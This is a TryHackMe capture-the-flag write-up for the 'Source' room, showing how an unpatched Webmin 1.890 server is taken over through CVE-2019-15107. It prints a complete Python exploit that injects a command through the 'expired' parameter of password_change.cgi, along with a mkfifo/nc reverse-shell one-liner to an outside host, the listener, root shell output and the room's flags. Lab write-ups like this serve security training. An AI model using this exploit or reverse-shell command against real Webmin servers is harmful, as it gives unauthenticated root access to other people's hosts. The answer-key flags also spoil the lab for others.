# 🔓 Source

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/source)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
| --- | --- |
| **Target** | `source.thm` |
| **OS** | Ubuntu 18.04 |
| **Attack Surface** | Webmin 1.890 — CVE-2019-15107 (unauthenticated RCE) |
| **Privesc** | None — shell lands directly as `root` |

Source is a one-punch box. Webmin 1.890 is exposed on port 10000 and is vulnerable to CVE-2019-15107, a pre-authentication RCE via the `password_change.cgi` endpoint. A single exploit request returns a shell as `root` — no privilege escalation required.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -oA tcpscan-source.thm source.thm
sudo nmap -sU -vv -oA udpscan-source.thm source.thm
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

UDP sweep confirmed `10000/udp` open (ndmp), consistent with Webmin running on both transports.

Two open services. SSH is a dead end without credentials. Webmin on 10000 is the entire attack surface.

### Webmin Fingerprinting

Navigating to `http://source.thm:10000` presents the Webmin login panel. The Nmap service banner already hands us the version: **MiniServ 1.890**.

A quick search confirms this falls within the vulnerable range for **CVE-2019-15107** — a pre-authentication RCE affecting Webmin < 1.920. The vulnerability lives in `password_change.cgi`, which fails to sanitise the `expired` POST parameter before passing it to a shell command. No credentials needed.

---

## 💀 Initial Access — CVE-2019-15107 Webmin RCE

### The Vulnerability

`password_change.cgi` is reachable without authentication when the "password expiry" feature is enabled (the default in some builds). The `expired` parameter is interpolated directly into a shell command. Sending an arbitrary value in that field triggers OS command execution as the web server user — which in this case is `root`.

### Exploit

```python
#!/usr/bin/env python3
"""
CVE-2019-15107 - Webmin Remote Code Execution Exploit
Targets password_change.cgi on Webmin < 1.920
"""

import argparse
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def send_exploit(target, port, command):
    host = f"{target}:{port}"
    url = f"{host}/password_change.cgi"
    headers = {
        'Referer': f"{host}/session_login.cgi",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    payload = f"expired={command}"
    response = requests.post(url, data=payload, headers=headers, verify=False)
    return response


r = send_exploit("http://source.thm", 10000, "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.204.251 4444 >/tmp/f")
print(f"[*] Response:\n{r.text}")
```

### Listener

```bash
nc -nlvp 4444
```

### Shell

```
connect to [192.168.204.251] from (UNKNOWN) [10.114.189.251] 51456
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Landed directly as `root`. No privesc path needed.

---

## 🚩 Flags

### User Flag

```bash
# cd /home/dark
# cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

The home directory also contains `webmin_1.890_all.deb` — the actual package installer used to stand up the vulnerable instance. A nice touch from the room author.

### Root Flag

```bash
# cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```

The flags tell the story: supply chain compromise (backdoored package) leads to a root shell because nobody updated.

---

## 🗺️ Attack Chain

```
[Nmap]
    Port 10000 → MiniServ 1.890 (Webmin)
          │
          ▼
[CVE-2019-15107]
    POST /password_change.cgi
    expired=<reverse_shell_payload>
    Referer: /session_login.cgi
          │
          ▼
[Reverse Shell]
    uid=0(root) — no privesc required
          │
          ├──▶  /home/dark/user.txt  →  THM{SUPPLY_CHAIN_COMPROMISE}
          └──▶  /root/root.txt       →  THM{UPDATE_YOUR_INSTALL}
```

---

## 📌 Key Takeaways

* Webmin 1.890 ships with a pre-auth RCE — CVE-2019-15107 — that requires zero credentials and is trivially exploitable. One POST request to `password_change.cgi` is all it takes.
* Webmin runs as `root` by default. A vulnerability in it isn't just a web app compromise — it's immediate full host takeover.
* The `webmin_1.890_all.deb` sitting in `/home/dark` makes the supply chain angle explicit: the room simulates a backdoored package intentionally installed on a system, mirroring real-world supply chain incidents.
* Patch management on internet-facing admin panels is non-negotiable. A one-version-behind Webmin install is a root shell waiting to happen.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| Python exploit | CVE-2019-15107 Webmin pre-auth RCE via password_change.cgi |
| `nc` | Reverse shell listener |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`THM{SUPPLY_CHAIN_COMPROMISE}`

</details>

<details>
<summary><code>root.txt</code></summary>

`THM{UPDATE_YOUR_INSTALL}`

</details>
